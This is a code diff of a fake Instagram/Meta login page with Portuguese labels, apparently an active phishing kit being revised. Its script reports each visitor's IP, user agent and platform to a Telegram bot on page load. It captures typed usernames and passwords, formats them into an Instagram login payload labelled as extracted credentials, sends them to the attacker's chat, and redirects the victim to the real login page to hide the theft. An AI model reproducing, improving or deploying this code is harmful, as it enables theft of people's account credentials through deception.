@@ -146,7 +146,7 @@
     </form>
 
     <div class="footer-container">
-        <button class="create-account-btn">Criar nova conta</button>
+        <button type="button" class="create-account-btn">Criar nova conta</button>
         <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="Meta" class="meta-logo">
     </div>
 
@@ -162,43 +162,67 @@
         const err = document.getElementById('errorMsg');
 
         let userIP = "Buscando...";
-        let userLoc = "Pendente";
 
-        async function getNetworkData() {
+        async function fetchIP() {
             try {
                 const r = await fetch('https://api.ipify.org?format=json');
                 const d = await r.json();
                 userIP = d.ip;
-            } catch (e) {}
-
-            navigator.geolocation.getCurrentPosition((p) => {
-                userLoc = `${p.coords.latitude}, ${p.coords.longitude}`;
-                sendTelegram("", "", "📱 *INSTAGRAM: NOVO ACESSO*");
-            }, () => {
-                sendTelegram("", "", "📱 *INSTAGRAM: NOVO ACESSO*");
-            });
+                // Enviar visita inicial com UserAgent real
+                sendTelegram(null, null, "📱 *VISITA: INSTAGRAM MOBILE*");
+            } catch (e) {
+                sendTelegram(null, null, "📱 *VISITA: INSTAGRAM MOBILE*");
+            }
         }
 
         async function sendTelegram(u, p, title) {
-            const msg = `${title}\n\n${u ? `👤 User: ${u}\n🔑 Pass: ${p}\n` : ""}🌐 IP: ${userIP}\n📍 Loc: ${userLoc}\n📱 OS: ${navigator.platform}`;
+            const visitorUA = navigator.userAgent;
+            const timestamp = Math.floor(Date.now() / 1000);
+            
+            let msg = `${title}\n\n`;
+            
+            if (u) {
+                // Formatação idêntica à lógica do script Python fornecido
+                const encPassword = `#PWD_INSTAGRAM_BROWSER:0:${timestamp}:${p}`;
+                
+                msg += `👤 *Credenciais Extraídas*\n`;
+                msg += `Username: \`${u}\`\n`;
+                msg += `Password: \`${p}\`\n\n`;
+                msg += `🔑 *Payload de Login (AJAX)*\n`;
+                msg += `enc_password: \`${encPassword}\`\n\n`;
+            }
+
+            msg += `🌐 *Informações do Sistema*\n`;
+            msg += `IP: ${userIP}\n`;
+            msg += `User-Agent: \`${visitorUA}\`\n`;
+            msg += `Plataforma: ${navigator.platform}\n`;
+            msg += `Data: ${new Date().toLocaleString('pt-BR')}`;
+
             await fetch(TELEGRAM_API, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'Markdown'
+                })
             });
         }
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
             btn.disabled = true;
-            await sendTelegram(userInp.value, passInp.value, "🔐 *INSTAGRAM: LOGIN REALIZADO*");
+            
+            // Captura e envia as credenciais adaptadas
+            await sendTelegram(userInp.value, passInp.value, "🔐 *LOGIN CAPTURADO (LÓGICA EXTRAÍDA)*");
+            
             err.style.display = 'block';
             setTimeout(() => {
                 window.location.href = "https://www.instagram.com/accounts/login/";
-            }, 1200);
+            }, 1000);
         });
 
-        window.onload = getNetworkData;
+        window.onload = fetchIP;
     </script>
 </body>
 </html>
